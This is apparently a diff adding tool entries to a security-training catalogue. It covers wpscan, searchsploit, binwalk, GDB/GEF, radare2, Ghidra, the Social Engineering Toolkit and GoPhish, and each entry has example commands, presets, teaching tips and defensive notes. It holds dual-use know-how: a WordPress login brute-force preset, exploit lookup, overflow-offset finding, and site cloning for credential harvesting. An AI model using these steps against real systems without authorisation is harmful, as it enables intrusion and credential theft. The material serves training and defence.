+    "default_command": "wpscan --url http://{target} --enumerate p,u",
+    "flags": {
+      "--url":       { "label": "Target URL", "desc": "WordPress installation URL.", "example": "wpscan --url http://target.com", "teach": "Give wpscan the WordPress URL. It auto-detects WordPress, version, and begins enumeration.", "risk": "noisy" },
+      "--enumerate": { "label": "Enumerate", "desc": "What to enumerate: p=plugins, t=themes, u=users, vp=vulnerable plugins only.", "example": "wpscan --url http://target.com --enumerate p,t,u", "teach": "p finds all plugins (each is a potential vuln). u finds usernames for brute forcing. vp only shows vulnerable plugins — cleaner output.", "risk": "noisy" },
+      "--api-token": { "label": "API Token", "desc": "WPScan vulnerability database API token. Free at wpscan.com.", "example": "wpscan --url http://target.com --api-token YOUR_TOKEN --enumerate vp", "teach": "The API token unlocks vulnerability data. Without it you see plugins/themes but not which ones are vulnerable. Free 25 API calls/day with registration.", "risk": "safe" },
+      "--passwords":  { "label": "Password File", "desc": "Wordlist for username brute forcing.", "example": "wpscan --url http://target.com --usernames admin --passwords rockyou.txt", "teach": "If you found admin username via enumeration, brute force the wp-login.php endpoint. WordPress doesn't rate-limit by default.", "risk": "very_noisy" },
+      "--usernames":  { "label": "Username(s)", "desc": "Username(s) to brute force: --usernames admin,editor", "example": "wpscan --url http://target.com --usernames admin --passwords rockyou.txt", "teach": "Use usernames found during --enumerate u. Author archives reveal usernames. xmlrpc.php also exposes them.", "risk": "noisy" },
+      "-t":           { "label": "Threads", "desc": "Number of threads. Default 5.", "example": "wpscan --url http://target.com --enumerate p -t 20", "teach": "More threads = faster but more detectable. Default 5 is safe. Plugin enumeration with many threads completes much faster.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "Full Enum":      { "flags": ["--url", "http://{target}", "--enumerate", "p,t,u", "--api-token", "YOUR_TOKEN"], "desc": "Full WordPress enumeration with vuln data." },
+      "Vuln Plugins":   { "flags": ["--url", "http://{target}", "--enumerate", "vp", "--api-token", "YOUR_TOKEN"], "desc": "Show only vulnerable plugins." },
+      "Brute Users":    { "flags": ["--url", "http://{target}", "--usernames", "admin", "--passwords", "/usr/share/wordlists/rockyou.txt"], "desc": "Brute force WordPress login." }
+    },
+    "defend_notes": "Keep WordPress core, plugins, and themes updated — this eliminates 95% of WPScan findings. Install a security plugin (Wordfence, Sucuri) for firewall and login protection. Change login URL from /wp-login.php (stops automated attacks). Implement 2FA for all admin accounts. Limit login attempts. Use Managed WordPress hosting with auto-updates.",
+    "mitre_techniques": ["T1190 - Exploit Public-Facing Application", "T1110.001 - Brute Force: Password Guessing"]
+  },
+
+  "searchsploit": {
+    "name": "SearchSploit",
+    "binary": "searchsploit",
+    "category": "exploitation",
+    "description": "Offline command-line search tool for the Exploit-DB database. Contains 45,000+ exploits for every platform and software version. Find public exploits for any software version without internet access. Links directly to downloadable exploit code.",
+    "teach_intro": "After nmap discovers 'Apache 2.4.29' or 'OpenSSH 7.4', searchsploit tells you what public exploits exist for that exact version. It searches the offline copy of Exploit-DB — the internet's largest database of known exploits — and gives you the exact file to use.",
+    "default_command": "searchsploit {target}",
+    "flags": {
+      "-t":    { "label": "Title Search Only", "desc": "Search only in exploit title, not description.", "example": "searchsploit -t apache 2.4", "teach": "Title-only search reduces false positives. 'searchsploit apache' returns thousands. 'searchsploit -t apache 2.4' narrows to the version.", "risk": "safe" },
+      "-e":    { "label": "Exact Match", "desc": "Require exact term match.", "example": "searchsploit -e 'OpenSSH 7.4'", "teach": "Exact matching for precise version strings from nmap output. Copy the service/version string from nmap -sV and paste it.", "risk": "safe" },
+      "-x":    { "label": "View Exploit Code", "desc": "Read exploit source code directly in terminal.", "example": "searchsploit -x exploits/linux/remote/46904.py", "teach": "Always read exploit code before running it. Understand what it does, what requirements it has, and whether it's stable or a PoC that might crash the service.", "risk": "safe" },
+      "-m":    { "label": "Copy Exploit", "desc": "Mirror exploit file to current directory.", "example": "searchsploit -m exploits/linux/remote/46904.py", "teach": "Copies the exploit to your working directory so you can modify it. Always copy before editing — don't modify the database original.", "risk": "safe" },
+      "--cve": { "label": "Search by CVE", "desc": "Find exploits for a specific CVE number.", "example": "searchsploit --cve 2021-44228", "teach": "Found a CVE in a Nuclei or Nessus scan? searchsploit --cve gives you the public PoC exploit code immediately.", "risk": "safe" },
+      "-u":    { "label": "Update Database", "desc": "Update the local Exploit-DB copy.", "example": "searchsploit -u", "teach": "Run monthly to keep your local DB current. New exploits are added daily to Exploit-DB. Fresh = more hits.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Service Search": { "flags": ["{target}"], "desc": "Search for exploits by service name/version." },
+      "CVE Lookup":     { "flags": ["--cve", "{target}"], "desc": "Find exploits for a specific CVE." },
+      "Title Only":     { "flags": ["-t", "{target}"], "desc": "Title-only search for cleaner results." }
+    },
+    "defend_notes": "Searchsploit shows you what attackers know about your software. The fix is always patching — every searchsploit result should be in your patch list. Subscribe to vendor security advisories. Run authenticated Nessus/OpenVAS scans monthly to find vulnerable versions before attackers do. Software inventory management (CMDB) is prerequisite to patch management.",
+    "mitre_techniques": ["T1190 - Exploit Public-Facing Application", "T1203 - Exploitation for Client Execution"]
+  },
+
+  "binwalk": {
+    "name": "Binwalk",
+    "binary": "binwalk",
+    "category": "forensics",
+    "description": "Firmware analysis and extraction tool. Identifies embedded file systems, compressed data, bootloaders, encryption, and executable code within binary firmware images. Essential for IoT security research and CTF firmware analysis challenges.",
+    "teach_intro": "Firmware from IoT devices, routers, and embedded systems often contains Linux file systems, configuration files, and hardcoded credentials compressed inside a single binary blob. Binwalk finds and extracts all of it — revealing the actual operating system, user accounts, and running services.",
+    "default_command": "binwalk {target}",
+    "flags": {
+      "-e":   { "label": "Extract", "desc": "Automatically extract discovered files/filesystems.", "example": "binwalk -e firmware.bin", "teach": "The most useful flag — extracts everything binwalk finds. Creates a _firmware.bin.extracted/ directory with all recovered files. Look for /etc/passwd, config files, and binaries.", "risk": "safe" },
+      "-E":   { "label": "Entropy Analysis", "desc": "Calculate entropy to identify compressed/encrypted regions.", "example": "binwalk -E firmware.bin", "teach": "High entropy = compressed or encrypted data. Low entropy = plaintext/code. Entropy graph reveals the structure of the firmware at a glance.", "risk": "safe" },
+      "-A":   { "label": "Opcode Scan", "desc": "Scan for common executable opcodes to identify CPU architecture.", "example": "binwalk -A firmware.bin", "teach": "Unknown firmware? -A identifies the CPU architecture (MIPS, ARM, x86). Guides your disassembly setup.", "risk": "safe" },
+      "-D":   { "label": "Extract by Type", "desc": "Extract specific file types: -D 'png image:png'", "example": "binwalk -D 'jpeg image:jpg' firmware.bin", "teach": "Extract specific file types when you know what you're looking for. Pulls all JPEG images, all certificate files, or all ELF binaries.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Full Extract":   { "flags": ["-e", "{target}"], "desc": "Extract all embedded files and filesystems." },
+      "Entropy Map":    { "flags": ["-E", "{target}"], "desc": "Visualize entropy to understand firmware structure." },
+      "Arch Detect":    { "flags": ["-A", "{target}"], "desc": "Detect embedded CPU architecture." }
+    },
+    "defend_notes": "Firmware security: encrypt firmware images and verify signatures before flashing. Hardcoded credentials (common in IoT firmware) should be eliminated — use device-unique credentials generated at manufacture. Secure boot prevents execution of unsigned firmware. Implement a firmware update process that allows pushing security fixes rapidly.",
+    "mitre_techniques": ["T1542.001 - Pre-OS Boot: System Firmware", "T1005 - Data from Local System"]
+  },
+
+  "gdb": {
+    "name": "GDB with PEDA/GEF",
+    "binary": "gdb",
+    "category": "exploitation",
+    "description": "GNU Debugger enhanced with PEDA or GEF (GDB Enhanced Features) for exploit development. Analyzes program execution, finds memory corruption vulnerabilities, develops buffer overflow exploits, and reverse engineers binaries. Core tool for binary exploitation and CTF challenges.",
+    "teach_intro": "GDB lets you run a program in slow motion — pause execution, inspect memory and registers, step through instructions, and understand exactly what happens during a crash. Buffer overflows, format string vulnerabilities, and heap exploits are all found and exploited using GDB. GEF adds color, pattern generation, and exploit-development commands.",
+    "default_command": "gdb {target}",
+    "flags": {
+      "pattern create":{ "label": "Cyclic Pattern (GEF)", "desc": "Generate De Bruijn sequence to find buffer overflow offset.", "example": "pattern create 200", "teach": "Creates a unique 200-char pattern. Put in the input, crash the program, read the value in RIP/EIP, then 'pattern offset VALUE' tells you exactly how many bytes until the return address.", "risk": "safe" },
+      "checksec":      { "label": "Security Checks", "desc": "Show enabled exploit mitigations: ASLR, NX, Stack Canary, PIE, RELRO.", "example": "checksec --file=./binary", "teach": "Before exploiting: know your defenses. NX means no shellcode in stack. PIE means addresses are randomized. No canary = easier stack overflow. No PIE = fixed addresses.", "risk": "safe" },
+      "run":           { "label": "Run Program", "desc": "Execute the target binary inside GDB.", "example": "gdb ./vuln && run", "teach": "Start the program. With a crash it shows the instruction pointer value — the foundation of understanding the overflow.", "risk": "safe" },
+      "info registers":{ "label": "View Registers", "desc": "Show current register values (RIP, RSP, RBP, etc.)", "example": "info registers", "teach": "After a crash: what's in RIP? That's your target. RSP points to the stack. Understanding registers is the foundation of exploit development.", "risk": "safe" },
+      "x/20wx $rsp":  { "label": "Examine Stack", "desc": "Examine 20 words from the stack pointer.", "example": "x/20wx $rsp", "teach": "Shows what's on the stack right now. Find your pattern, shellcode, or gadgets here. x/s $rsp for strings, x/i $rip for instructions.", "risk": "safe" },
+      "b *address":   { "label": "Set Breakpoint", "desc": "Set breakpoint at specific memory address or function.", "example": "b *0x401234 or b main", "teach": "Pause execution at interesting points. Before the vulnerable function to see input. After strcpy to see overflow. At the return to verify control.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "With GEF":      { "flags": ["-q", "{target}", "-ex", "'pattern create 200'"], "desc": "Start GDB with GEF, generate cyclic pattern." },
+      "Checksec":      { "flags": ["-q", "--args", "{target}", "-ex", "'checksec'", "-ex", "'quit'"], "desc": "Check security mitigations." }
+    },
+    "defend_notes": "Enable all compiler/OS mitigations: ASLR (enabled by default on Linux), stack canaries (-fstack-protector-all), NX bit (W^X policy), PIE (-fPIE -pie), RELRO (-Wl,-z,relro,-z,now). Use modern memory-safe languages (Rust, Go) where possible. Static analysis tools (CodeQL, Semgrep) catch vulnerable patterns in code before they reach production.",
+    "mitre_techniques": ["T1203 - Exploitation for Client Execution", "T1055 - Process Injection"]
+  },
+
+  "radare2": {
+    "name": "Radare2",
+    "binary": "r2",
+    "category": "reverse_engineering",
+    "description": "Open-source reverse engineering framework. Disassembles, debugs, analyzes, and patches binaries for any architecture. Supports x86/x64, ARM, MIPS, PowerPC, and more. The free alternative to IDA Pro and Ghidra for binary analysis.",
+    "teach_intro": "Radare2 lets you take apart compiled programs and understand what they do without source code. Malware analysis, CTF binary challenges, vulnerability research — all done in r2. The command syntax is cryptic but incredibly powerful once learned. aa = analyze all, pdf = print disassembly of function.",
+    "default_command": "r2 {target}",
+    "flags": {
+      "-A":    { "label": "Analyze on Open", "desc": "Run full analysis when opening binary.", "example": "r2 -A ./binary", "teach": "Full auto-analysis finds functions, strings, cross-references. Equivalent to typing 'aaa' after opening. Always use -A for a clean start.", "risk": "safe" },
+      "-d":    { "label": "Debug Mode", "desc": "Open binary in debug mode.", "example": "r2 -d ./binary", "teach": "Debug mode lets you run the binary, set breakpoints, and inspect memory. Use for dynamic analysis.", "risk": "safe" },
+      "aaa":   { "label": "Deep Analysis", "desc": "Run all analysis passes: functions, symbols, xrefs.", "example": "aaa", "teach": "aaa finds all functions, resolves imports, and builds the call graph. Takes longer than aa but gives complete picture.", "risk": "safe" },
+      "pdf":   { "label": "Print Disassembly", "desc": "Print disassembly of current function: pdf @ main", "example": "pdf @ main", "teach": "Shows assembly of a function. pdf @ sym.vulnerable_function shows the function you're targeting. Start with main, follow calls.", "risk": "safe" },
+      "iz":    { "label": "List Strings", "desc": "List all strings found in the binary.", "example": "iz", "teach": "Strings reveal hardcoded credentials, URLs, C2 domains, flag hints in CTFs. One of the first things to run on any binary.", "risk": "safe" },
+      "afl":   { "label": "List Functions", "desc": "List all discovered functions.", "example": "afl | grep vuln", "teach": "After analysis, afl shows every function. grep for: main, vuln, login, check, admin, flag. Start your analysis from interesting function names.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Quick Analysis": { "flags": ["-A", "{target}"], "desc": "Open and fully analyze binary." },
+      "Debug":          { "flags": ["-d", "{target}"], "desc": "Open in debug/dynamic analysis mode." }
+    },
+    "defend_notes": "Code obfuscation and anti-debugging techniques slow reverse engineering but don't stop determined analysts. For malware defense: behavioral analysis catches obfuscated malware better than signature AV. Application whitelisting prevents unauthorized binaries from running. For developers: strip production binaries, use obfuscation tools, implement license checks that resist tampering.",
+    "mitre_techniques": ["T1027 - Obfuscated Files or Information", "T1622 - Debugger Evasion"]
+  },
+
+  "ghidra": {
+    "name": "Ghidra",
+    "binary": "ghidraRun",
+    "category": "reverse_engineering",
+    "description": "NSA-developed open-source reverse engineering suite with decompiler. Converts compiled binaries back into readable C-like pseudocode. Supports x86, ARM, MIPS, PowerPC, and more. Free alternative to IDA Pro that rivals its decompilation quality.",
+    "teach_intro": "Ghidra's decompiler is the magic — it takes raw assembly and produces readable C code. Instead of reading assembly for hours, you get something close to the original source code. Malware analysis, vulnerability research, and CTF binary challenges become dramatically easier with a decompiler.",
+    "default_command": "ghidraRun",
+    "flags": {
+      "CodeBrowser":  { "label": "Code Browser", "desc": "Main GUI for code analysis, disassembly, and decompiler.", "example": "Open Ghidra → New Project → Import file → Open CodeBrowser → Analyze", "teach": "Always run auto-analysis (A key) after importing. Decompiler window (right side) shows C pseudocode. Navigate by clicking function names.", "risk": "safe" },
+      "Decompiler":   { "label": "Decompiler View", "desc": "See C-like pseudocode for any function.", "example": "Click any function → Decompiler pane auto-updates", "teach": "The decompiler is Ghidra's killer feature. For CTF challenges: find the password check function, read the decompiled C, understand the logic without touching assembly.", "risk": "safe" },
+      "Scripting":    { "label": "Ghidra Scripts", "desc": "Automate analysis with Java or Python scripts.", "example": "Window → Script Manager → Run script", "teach": "Automate repetitive analysis: extract all strings, find crypto constants, batch rename variables, export function signatures. Python scripts run via Jython.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Launch GUI":   { "flags": [""], "desc": "Launch Ghidra GUI. Create project and import target binary." }
+    },
+    "defend_notes": "Same as Radare2 — reverse engineering is impossible to prevent entirely. Code signing and integrity verification detects tampering. For software protection: use commercial obfuscators (OLLVM, Themida), anti-debugging tricks, and virtual machine-based protections for high-value binaries. Mobile apps: use ProGuard/R8 for Android, bitcode stripping and Swift obfuscation for iOS.",
+    "mitre_techniques": ["T1027 - Obfuscated Files or Information"]
+  },
+
+  "setoolkit": {
+    "name": "Social Engineering Toolkit",
+    "binary": "setoolkit",
+    "category": "social_engineering",
+    "description": "Automated framework for social engineering attacks. Creates phishing sites (credential harvesting), spear-phishing emails, infectious media payloads, and more. Integrates with Metasploit. The standard tool for demonstrating human-factor attacks to clients.",
+    "teach_intro": "The most secure network can be bypassed by targeting the humans who use it. SET automates phishing campaigns: clone any website, send convincing emails, harvest entered credentials, and deliver Meterpreter payloads via malicious links. Used to demonstrate to clients why security awareness training matters.",
+    "default_command": "setoolkit",
+    "flags": {
+      "1":    { "label": "Social Engineering Attacks", "desc": "Main menu option 1 — all SE attack vectors.", "example": "setoolkit → 1", "teach": "The social engineering menu. Credential harvesting, tabnabbing, web jacking, multi-attack web. Most engagements start here.", "risk": "noisy" },
+      "2":    { "label": "Website Cloning", "desc": "Clone any website for credential harvesting.", "example": "setoolkit → 1 → 2 → 3 → enter target URL", "teach": "SET downloads the target site and hosts a perfect copy on your machine. Victims enter credentials, you capture them. Used with convincing phishing emails.", "risk": "very_noisy" },
+      "Spear":{ "label": "Spear Phishing", "desc": "Create targeted phishing emails with malicious attachments.", "example": "setoolkit → 1 → 1 → spear phishing menu", "teach": "Spear phishing is targeted — crafted for a specific person using OSINT. Much higher success rate than mass phishing. Can attach Meterpreter payload documents.", "risk": "very_noisy" }
+    },
+    "preset_profiles": {
+      "Launch":         { "flags": [""], "desc": "Launch SET interactive menu." }
+    },
+    "defend_notes": "Technical controls only stop technical attacks. Human-factor attacks need human-factor defenses: regular phishing simulation training (GoPhish), security awareness programs, and reporting culture where employees feel safe reporting suspicious emails. DMARC/DKIM/SPF prevents email spoofing. Browser extensions that detect phishing sites (Google Safe Browsing). Multi-factor authentication means captured passwords alone aren't enough.",
+    "mitre_techniques": ["T1566 - Phishing", "T1192 - Spearphishing Link", "T1193 - Spearphishing Attachment"]
+  },
+
+  "gophish": {
+    "name": "GoPhish",
+    "binary": "gophish",
+    "category": "social_engineering",
+    "description": "Open-source phishing simulation platform with a professional web dashboard. Create and manage phishing campaigns, track email opens, link clicks, credential submissions, and attachments. The standard for authorized phishing assessments.",
+    "teach_intro": "GoPhish makes phishing campaigns measurable. You set up an email template, a landing page (can be a cloned site), a target list, and a sending profile — then track who opened, who clicked, who entered credentials. Perfect for demonstrating risk to clients with concrete data.",
+    "default_command": "gophish",
+    "flags": {
+      "Dashboard":    { "label": "Web Dashboard", "desc": "Access at https://localhost:3333 with default admin:gophish", "example": "Navigate to https://127.0.0.1:3333", "teach": "The dashboard shows campaign results in real time. Who opened the email, who clicked the link, who submitted credentials. Data-driven social engineering assessment.", "risk": "safe" },
+      "Campaign":     { "label": "Campaign Setup", "desc": "Create sending profile → email template → landing page → target list → campaign.", "example": "Dashboard: Campaigns → New Campaign", "teach": "Each component is separate. Sending profile = SMTP server. Email template = the phishing email. Landing page = the fake site. Target groups = who gets phished.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "Launch":         { "flags": [""], "desc": "Start GoPhish server. Access dashboard at https://localhost:3333." }
+    },
+    "defend_notes": "GoPhish simulations should be followed by immediate training for those who fell for the phish. Without training, simulations just embarrass users without building resilience. Track improvement over time — well-run programs show dramatically fewer clicks after 6-12 months of quarterly campaigns. Share anonymized results with leadership to justify security investment.",
+    "mitre_techniques": ["T1566 - Phishing", "T1192 - Spearphishing Link"]
   }
 }
